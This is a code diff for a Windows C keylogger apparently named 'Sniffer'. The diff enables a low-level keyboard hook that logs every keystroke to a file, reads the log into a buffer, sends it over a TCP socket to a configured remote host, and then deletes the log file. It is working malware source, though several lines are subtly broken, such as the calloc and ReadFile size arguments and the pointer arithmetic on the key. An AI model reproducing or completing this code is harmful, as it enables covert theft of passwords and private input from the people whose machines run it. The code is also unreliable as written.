@@ -20,7 +20,7 @@ HANDLE filehandle;
 DWORD dwBytesWritten;
 char *filename = "C:\\Users\\amitz\\source\\repos\\Sniffer\\log.txt";
 int writeKeyToFile(PKBDLLHOOKSTRUCT key);
-int writeToSocket();
+char *fileToBuffer();
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -37,11 +37,51 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 int main() {
     int iResult;
     int sendbuflen = DEFAULT_BUFLEN;
+    BOOL bRet;
+    // Register the window class.
+    const wchar_t CLASS_NAME[] = L"Sample Window Class";
 
-    /*keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);
+    WNDCLASS wc = { 0};
+    HWND hInstance = NULL;
+    wc.lpfnWndProc = DefWindowProc;
+    wc.hInstance = hInstance;
+    wc.lpszClassName = CLASS_NAME;
+    RegisterClass(&wc);
+    HWND hwnd = CreateWindowEx(
+        0,                              // Optional window styles.
+        CLASS_NAME,                     // Window class
+        L"Learn to Program Windows",    // Window text
+        WS_OVERLAPPEDWINDOW,            // Window style
+
+        // Size and position
+        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
+
+        NULL,       // Parent window    
+        NULL,       // Menu
+        hInstance,  // Instance handle
+        NULL        // Additional application data
+    );
+
+    if (hwnd == NULL)
+    {
+        return 0;
+    }
+    ShowWindow(hwnd, 5);
+    keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);
     MSG msg = { 0 };
-    while (GetMessage(&msg, NULL, 0, 0) != 0);
-    UnhookWindowsHookEx(keyboardHook);*/
+    while ((bRet = GetMessage(&msg, hwnd, 0, 0)) != 0)
+    {
+        if (bRet < 0)
+        {
+            break;
+        }
+        else
+        {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+    }
+    UnhookWindowsHookEx(keyboardHook);
 
     // Initialize Winsock
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -57,7 +97,7 @@ int main() {
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
-    
+
 
     // Resolve the server address and port
     iResult = getaddrinfo(HOST_IP, DEFAULT_PORT, &hints, &result);
@@ -86,22 +126,32 @@ int main() {
         ConnectSocket = INVALID_SOCKET;
     }
 
-    char sendbuf[] = TEXT("this is a test");
+
+    char *sendbuf = fileToBuffer();
     char buf_size[20] = { 0 };
-    sprintf(buf_size, "%d", sizeof(sendbuf));
-    
+    char inputBuffer[3] = { 0 };
+    int send_buf_size = strlen(sendbuf);
+    sprintf(buf_size, "%d", send_buf_size);
+
     do {
-        //iResult = send(ConnectSocket, sendbuf, sizeof(sendbuf), 0);
         iResult = send(ConnectSocket, buf_size, sizeof(buf_size), 0);
         if (iResult > 0) {
             printf("Bytes sent: %d\n", iResult);
-            iResult = send(ConnectSocket, sendbuf, sizeof(buf_size), 0);
-            break;
+            iResult = recv(ConnectSocket, inputBuffer, 3, 0);
+            if (iResult < 1) {
+                printf("Bytes recieved: %d\n", iResult);
+                break;
+            }
+            if (strcmp(inputBuffer, "OK") == 0) {
+                printf("Sending data to server\n");
+                iResult = send(ConnectSocket, sendbuf, send_buf_size, 0);
+                break;
+            }
         }
         else if (iResult == 0) {
             printf("Connection closed\n");
             break;
-        }           
+        }
         else {
             printf("send failed: %d\n", WSAGetLastError());
             break;
@@ -110,31 +160,56 @@ int main() {
     } while (1);
 
     freeaddrinfo(result);
-
+    free(sendbuf);
+    int ret = DeleteFileA(filename);
+    if (ret == 0) {
+        printf("Delete file %s failed: %d\n", filename, WSAGetLastError());
+            return 1;
+    }
     if (ConnectSocket == INVALID_SOCKET) {
         printf("Unable to connect to server!\n");
         WSACleanup();
         return 1;
     }
     return 0;
-}
-
-int writeKeyToFile(PKBDLLHOOKSTRUCT key)
-{
-    filehandle = CreateFileA(TEXT(filename), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (filehandle == INVALID_HANDLE_VALUE) {
-        printf("\nCould not open %s.\n", filename);
-        return 1;
     }
-    int ret = WriteFile(filehandle, key, 1, &dwBytesWritten, NULL);
-    if (ret != 1) {
-        printf("\nfailed to write %s to file.\n", key);
-    }
-    CloseHandle(filehandle);
-    return 0;
-}
 
-int writeToSocket(){
-    
-    return 0;
-}
+    int writeKeyToFile(PKBDLLHOOKSTRUCT key)
+    {
+        filehandle = CreateFileA(TEXT(filename), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (filehandle == INVALID_HANDLE_VALUE) {
+            printf("\nCould not open %s.\n", filename);
+            return 1;
+        }
+        if (strcmp(key, "\r") == 0){
+            strcpy(key, "\n");
+        }
+        if (key - 32 >= 0) {
+            int ret = WriteFile(filehandle, key, 1, &dwBytesWritten, NULL);
+            if (ret != 1) {
+                printf("\nfailed to write %s to file.\n", key);
+            }
+        }
+        CloseHandle(filehandle);
+        return 0;
+    }
+
+    char *fileToBuffer(){
+        int ret = 0;
+        filehandle = CreateFileA(TEXT(filename), FILE_GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        LARGE_INTEGER largeInt = { 0 };
+        ret = GetFileSizeEx(filehandle, &largeInt);
+        if (ret == 0) {
+            printf("GetFileSizeEx failed: %d\n", GetLastError());
+            return NULL;
+        }
+        char *readBuffer = (char *)calloc(1, &largeInt + 1);
+        ret = ReadFile(filehandle, readBuffer, &largeInt, NULL, NULL);
+        if (ret == 0) {
+            printf("ReadFile failed: %d\n", GetLastError());
+            return NULL;
+        }
+        CloseHandle(filehandle);
+        return readBuffer;
+    }
+
